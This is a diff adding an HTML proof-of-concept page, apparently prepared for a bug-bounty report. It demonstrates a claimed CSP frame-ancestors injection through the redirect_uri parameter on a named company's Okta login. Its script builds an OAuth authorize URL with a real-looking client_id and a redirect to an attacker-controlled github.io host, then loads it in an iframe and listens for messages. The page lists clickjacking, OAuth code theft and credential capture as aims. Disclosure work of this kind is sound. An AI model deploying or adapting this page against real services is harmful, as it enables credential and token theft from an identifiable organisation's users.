@@ -1,0 +1,172 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Anduril CSP Bypass PoC</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: #1a1a2e;
+            color: #eee;
+            padding: 20px;
+            margin: 0;
+        }
+        .container {
+            max-width: 900px;
+            margin: 0 auto;
+            background: #16213e;
+            border-radius: 10px;
+            overflow: hidden;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.5);
+        }
+        .header {
+            background: #e94560;
+            padding: 25px;
+            text-align: center;
+        }
+        .header h1 {
+            margin: 0;
+            font-size: 22px;
+        }
+        .info {
+            padding: 20px;
+            background: #0f3460;
+            border-bottom: 2px solid #e94560;
+        }
+        .info p {
+            margin: 8px 0;
+            font-size: 14px;
+        }
+        .info strong {
+            color: #e94560;
+        }
+        .poc {
+            padding: 20px;
+        }
+        .warning {
+            background: #533483;
+            padding: 15px;
+            border-radius: 6px;
+            margin-bottom: 20px;
+            border-left: 4px solid #e94560;
+        }
+        .warning h3 {
+            margin-top: 0;
+            color: #e94560;
+        }
+        .iframe-box {
+            border: 3px solid #e94560;
+            border-radius: 8px;
+            overflow: hidden;
+            margin-top: 15px;
+        }
+        .iframe-label {
+            background: #e94560;
+            padding: 10px;
+            text-align: center;
+            font-weight: bold;
+        }
+        iframe {
+            width: 100%;
+            height: 600px;
+            border: none;
+            display: block;
+            background: white;
+        }
+        code {
+            background: #0f3460;
+            padding: 2px 6px;
+            border-radius: 3px;
+            font-family: monospace;
+            color: #4ecca3;
+        }
+        .attack-info {
+            background: #0f3460;
+            padding: 15px;
+            border-radius: 6px;
+            margin-top: 20px;
+        }
+        .attack-info ul {
+            margin: 10px 0;
+            padding-left: 20px;
+        }
+        .attack-info li {
+            margin: 5px 0;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Header -->
+        <div class="header">
+            <h1>🔴 Security Research: CSP Bypass via redirect_uri Injection</h1>
+        </div>
+
+        <!-- Info -->
+        <div class="info">
+            <p><strong>Target:</strong> Anduril Industries (anduril.okta.com)</p>
+            <p><strong>Researcher:</strong> zeta-47 @ HackerOne</p>
+            <p><strong>Vulnerability:</strong> Content-Security-Policy Header Injection</p>
+            <p><strong>Impact:</strong> Clickjacking + OAuth Code Theft</p>
+            <p><strong>Severity:</strong> HIGH (CVSS 7.1)</p>
+        </div>
+
+        <!-- PoC Content -->
+        <div class="poc">
+            <div class="warning">
+                <h3>⚠️ How This Attack Works:</h3>
+                <p>The <code>redirect_uri</code> parameter is injected into the CSP <code>frame-ancestors</code> directive without proper validation.</p>
+                <p><strong>Malicious URL:</strong><br>
+                <code>https://aplogviewer.anduril.dev.YOUR-GITHUB-USERNAME.github.io</code></p>
+            </div>
+
+            <h3 style="color: #e94560;">📺 Live Demonstration:</h3>
+            <p>The iframe below should be <strong>blocked</strong> by CSP, but due to the injection vulnerability, it loads successfully:</p>
+
+            <div class="iframe-box">
+                <div class="iframe-label">
+                    ⚠️ EMBEDDED OKTA LOGIN PAGE (Should be blocked by CSP)
+                </div>
+                <iframe 
+                    id="vulnerable-iframe"
+                    src="about:blank">
+                </iframe>
+            </div>
+
+            <div class="attack-info">
+                <h3 style="color: #4ecca3;">🎯 What Attackers Can Do:</h3>
+                <ul>
+                    <li>✅ Embed Okta login in malicious page</li>
+                    <li>✅ Overlay invisible elements (Clickjacking)</li>
+                    <li>✅ Steal OAuth authorization codes</li>
+                    <li>✅ Trick users into granting app permissions</li>
+                    <li>✅ Capture credentials via UI manipulation</li>
+                </ul>
+                
+                <h3 style="color: #4ecca3; margin-top: 20px;">🔧 Technical Details:</h3>
+                <p><strong>Injected CSP Header:</strong></p>
+                <code style="display: block; padding: 10px; margin-top: 10px;">
+                    frame-ancestors 'self' https://aplogviewer.anduril.dev.YOUR-USERNAME.github.io
+                </code>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // بناء الـ URL الخبيث
+        const githubUsername = window.location.hostname.split('.')[0]; // هياخد username تلقائي
+        const maliciousUrl = `https://anduril.okta.com/oauth2/v1/authorize?client_id=0oa1p85y61NjjJU3q4h7&redirect_uri=https://aplogviewer.anduril.dev.${githubUsername}.github.io/callback&response_type=code&scope=openid&state=poc_attack&nonce=12345`;
+        
+        // تحميل الـ iframe
+        setTimeout(() => {
+            document.getElementById('vulnerable-iframe').src = maliciousUrl;
+        }, 1000);
+
+        // لوج أي رسائل من الـ iframe
+        window.addEventListener('message', function(e) {
+            console.log('Message received from iframe:', e);
+        });
+    </script>
+</body>
+</html>
